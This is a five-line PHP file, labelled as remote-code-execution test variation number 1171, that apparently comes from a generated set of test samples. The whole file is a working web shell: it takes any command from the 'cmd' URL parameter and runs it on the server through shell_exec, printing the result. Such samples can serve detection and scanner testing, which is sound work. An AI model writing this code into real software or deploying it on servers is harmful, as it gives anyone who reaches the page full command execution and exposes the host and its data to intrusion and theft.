<?php
// RCE test variation #1171
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>